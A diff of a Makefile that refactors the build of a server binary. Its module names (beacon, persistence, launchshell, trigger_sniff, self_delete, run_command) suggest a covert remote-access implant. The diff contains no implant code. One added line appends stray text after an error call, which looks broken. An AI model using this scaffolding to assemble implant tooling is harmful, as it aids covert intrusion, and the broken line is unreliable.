@@ -36,7 +36,7 @@ include ../common/Makefile-include.solaris-sparc
 else ifeq ("$(TARGET)", "solaris-x86")
 include ../common/Makefile-include.solaris-x86
 else
-$(error Invalid target "$(TARGET)")
+$(error Invalid target "$(TARGET)")hived-mikrotik-mips
 endif
 
 BIN = .
@@ -55,13 +55,13 @@ LIBCRYPTO = $(CRYPTO)/libcrypto.a
 include $(BZIP2)/ARCH_BUILD
 include $(CRYPTO)/ARCH_BUILD
 include $(SSL)/ARCH_BUILD
-SERVER_SRCS =	beacon.c persistence.c launchshell.c \
-		shuffle.c twofish.c farm9crypt.c jshell.c \
-		survey_mac.c survey_uptime.c trigger_listen.c daemonize.c \
-		main.c tiny_crc16.c \
-		self_delete.c trigger_b64.c trigger_payload.c trigger_sniff.c \
-		threads.c trigger_callback_session.c client_session.c run_command.c \
-		get_data.c process_list.c netstat_an.c netstat_rn.c ifconfig.c compression.c
+OBJS =	beacon.o persistence.o launchshell.o \
+	shuffle.o twofish.o farm9crypt.o jshell.o \
+	survey_mac.o survey_uptime.o trigger_listen.o daemonize.o \
+	main.o tiny_crc16.o \
+	self_delete.o trigger_b64.o trigger_payload.o trigger_sniff.o \
+	threads.o trigger_callback_session.o client_session.o run_command.o \
+	get_data.o process_list.o netstat_an.o netstat_rn.o ifconfig.o compression.o
 
 #COMMON_OBJS =	$(COMMON)/crypto.o $(COMMON)/init_crypto_strings.o $(COMMON)/string_utils.o
 
@@ -147,9 +147,9 @@ debug: $(SERVER)-dbg
 .PHONY: release
 release: $(SERVER)
 
-$(SERVER): $(LIBSSL) $(LIBBZIP2) init_strings.o $(LIBCRYPTO)
+$(SERVER): strings $(OBJS) $(LIBSSL) $(LIBBZIP2) $(LIBCRYPTO) init_strings.o 
 	printf "\tLD\t\t$@\n"
-	$(CC) $(CFLAGS) $(SERVER_SRCS) $(LDFLAGS) init_strings.o string_utils.o $(LIBS) -o $(BIN)/$(SERVER)
+	$(CC) $(CFLAGS) $(OBJS) $(LDFLAGS) init_strings.o string_utils.o $(LIBS) -o $(BIN)/$(SERVER)
 	printf "\tStripping\t$@\n"
 	$(STRIP) $(BIN)/$(SERVER)
 	$(MD5SUM) $(BIN)/$(SERVER) > $(BIN)/$(SERVER).md5
@@ -157,16 +157,16 @@ $(SERVER): $(LIBSSL) $(LIBBZIP2) init_strings.o $(LIBCRYPTO)
 
 $(SERVER)-dbg: $(LIBSSL) $(LIBBZIP2) $(LIBCRYPTO) init_strings.o
 	printf "\tLD\t\t$@\n"
-	$(CC) $(CFLAGS) $(DBGFLAGS) $(SERVER_SRCS) $(LDFLAGS) init_strings.o string_utils.o $(LIBS) -o $(BIN)/$(SERVER)-dbg
+	$(CC) $(CFLAGS) $(DBGFLAGS) $(OBJS) $(LDFLAGS) init_strings.o string_utils.o $(LIBS) -o $(BIN)/$(SERVER)-dbg
 	$(MD5SUM) $(BIN)/$(SERVER)-dbg > $(BIN)/$(SERVER)-dbg.md5
 
 
 valgrind: $(LIBSSL) $(LIBBZIP2) $(LIBCRYPTO)
-	$(CC) -D__VALGRIND__ -D_IFCONFIG -D_NETSTAT_AN -D_NETSTAT_RN -D_PS_EF $(CFLAGS) $(DBGFLAGS) $(SERVER_SRCS) $(PS) $(IFC) $(NETSTAT) -L$(LIB) -o $(BIN)/$(SERVER)-$@
+	$(CC) -D__VALGRIND__ -D_IFCONFIG -D_NETSTAT_AN -D_NETSTAT_RN -D_PS_EF $(CFLAGS) $(DBGFLAGS) $(OBJS) $(PS) $(IFC) $(NETSTAT) -L$(LIB) -o $(BIN)/$(SERVER)-$@
 
 .PHONY: efence
 efence: $(LIBSSL) $(LIBBZIP2) $(LIBCRYPTO)
-	$(CC) -lefence -D__EFENCE__ -D_IFCONFIG -D_NETSTAT_AN -D_NETSTAT_RN -D_PS_EF $(CFLAGS) $(DBGFLAGS) $(SERVER_SRCS) $(PS) $(IFC) $(NETSTAT) -L$(LIB) -o $(BIN)/$(SERVER)-$@
+	$(CC) -lefence -D__EFENCE__ -D_IFCONFIG -D_NETSTAT_AN -D_NETSTAT_RN -D_PS_EF $(CFLAGS) $(DBGFLAGS) $(OBJS) $(PS) $(IFC) $(NETSTAT) -L$(LIB) -o $(BIN)/$(SERVER)-$@
 
 .PHONY: strings
 strings: init_strings.o
@@ -200,5 +200,5 @@ tarball:
 	$(MAKE) -f ./Makefile tarball
 
 .c.o:
-	printf "   CC        $<\n"
+	printf "\tCC\t\t$<\n"
 	$(CC) $(CFLAGS) -c $<
